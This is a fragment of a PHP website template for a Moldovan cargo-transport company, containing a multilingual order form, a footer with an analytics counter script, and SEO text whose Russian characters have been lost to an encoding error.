								?> <span style="color: red">*</span></div>
	+ <span id="tel_span"><span id="left_cargo_form_telefon_country_code_span"><input type="text" name="telefon_country_code" size="1" maxlength="3" id="telefon_country_code" style="width: 25px" /></span>
	- <span id="left_cargo_form_telefon_city_code_span"><input type="text" name="telefon_city_code" size="2" maxlength="4" id="telefon_city_code" style="width: 30px" /></span>
	- <span id="left_cargo_form_telefon_span"><input type="text" name="telefon" size="15" maxlength="15" id="telefon"  style="width: 125px" /></span></span>
	</td>
</tr>


<tr>
	<td style="padding-bottom:8px;"><div>E-mail<span style="color: red">*</span></div>
	<span id="left_cargo_form_email_span"><input type="text" name="email" size="25"  style="width: 220px" /></span></td>
</tr>


<!--<tr>
	<td style="padding-bottom:8px;"><div>Skype</div> <input type="text" name="skype" size="25"  style="width: 220px" /></td>
</tr>


<tr>
	<td style="padding-bottom:10px;"><div>ICQ</div> <input type="text" name="icq" size="25" style="width: 220px"  /></td>
</tr>-->


<tr>
	<td style="padding-bottom:10px;"><div style="margin-top:5px; margin-bottom:5px;"><span style="color: red">*</span> - <?php if($mosConfig_lang == 'russian') { echo "������������ ����"; }
								elseif ($mosConfig_lang == 'romanian') { echo "campuri obligatorii"; }
								elseif ($mosConfig_lang == 'english') { echo "required fields"; }
								?></div>
	<div class="button_left"> </div>
	<input type="submit" name="submit" value="<?php if($mosConfig_lang == 'russian') { echo "��������"; }
								elseif ($mosConfig_lang == 'romanian') { echo "Comanda"; }
								elseif ($mosConfig_lang == 'english') { echo "Order"; }
								?>" id="submit" style="float:left;background-image:url(<?php echo $tmpTools->baseurl(); ?>/templates/ja_mesolite/images/button_back.png);background-repeat:repeat-x;height:31px;line-height:31px;width:100px;border:0;color:white;cursor:pointer;"/>
	<div class="button_right"></div>
	</td>
</tr>

</table>
</form>
</div>

<!--   ����� ����������  END  -->
							<?/*
							<h3>�������:</h3>
							<a title="������������� ��������������, ����� ������ � ����������" href="http://www.com-stil.com">
								<object width="238" height="80" align="middle" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=8,0,0,0" classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000">
									<param value="sameDomain" name="allowScriptAccess">
									<param value="false" name="allowFullScreen">
									<param value="Com-stil.swf" name="movie">
									<param value="high" name="quality">
									<param value="#ffffff" name="bgcolor">	
									<embed width="238" height="80" align="middle" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" allowfullscreen="false" allowscriptaccess="sameDomain" name="index_last_last" bgcolor="#ffffff" quality="high" src="Com-stil.swf">
								</object>
							</a>
							*/?>
                              <br style="font-size:1px;height:1px;clear:both;"/>
                                <ul class="leftmenu">
                                	<!--<li><a href="#">�������� �����</a></li>
                                    <li><a href="index.php?option=com_content&task=view&id=2&Itemid=13">��������</a></li>-->
                                </ul>
            </div>    
            <?php } ?>            
            <?php mosMainBody(); ?>
            <?php mosLoadModules ( 'user5',-1); ?>
          	
		  </div>
		  <div style="font-size:1px;height:1px;clear:both;"></div>
    </div>
    </div>
    <div class="footer">
		<table>
			<tr>
				<td><div class="copy"><p>2009 &copy; Moldovatruck</p><a href="index.php?option=com_xmap&Itemid=12">����� �����</a>
				| <a href="index.php?option=com_performs&formid=1&Itemid=57">�������� �����</a>
				
				<p>
<!--Openstat-->
<span id="openstat2064831"></span><script type="text/javascript"> var openstat = { counter: 2064831, image: 25, next: openstat , track_links: "ext" }; document.write(unescape("%3Cscript%20src=%22http" +
(("https:" == document.location.protocol) ? "s" : "") +
"://openstat.net/cnt.js%22%20defer=%22defer%22%3E%3C/script%3E")); </script>
<!--Openstat-->
</p>


				</div></td>
				<td>
					<div class="seo_text">������������� �������������� �� �������� � ������. �������������� ������� ������ �� ������� � ������. �������� ������ �� ������ � �������. ������������� ������� ������� ������ �� ������, ������, � ������, ���������. ������������ �������������� �������� �� ��������. ������������ ������ �� ��������� ������������� ����� �� ��������, ������, ������ � �������. ������������ ���� ����� ����������, ����� �����. ��������� ��� �������� ������ �� ������ � ������. ��������� ������������,��������� �������� ����������� �� ������, ������ � �������, �������. ������ ��������� �������� ������ �� ������ � ������� � �������.<br><br>
					<span style="font-size: 11px; color: rgb(0, 0, 0);">��� ����� ��������. ��� ����������� � ������������� ���������� � ����� ����������� �� www.moldovatruck.md �����������.</span> <!--<br>������������ ������. ����������� ������ - <a href="http://www.movers-auto.md" target="_blank">www.movers-auto.md</a>, <a href="http://www.riatec.md" target="_blank">www.riatec.md</a>-->
					<br><br>
					
					�������� ����� - <a style="color:#FFFFFF;" target="_blank" href="http://magicweb.md">Magic-Web</a>

</div>
				</td>
			</tr>
		</table>
    </div>

</div>
</body>

</html>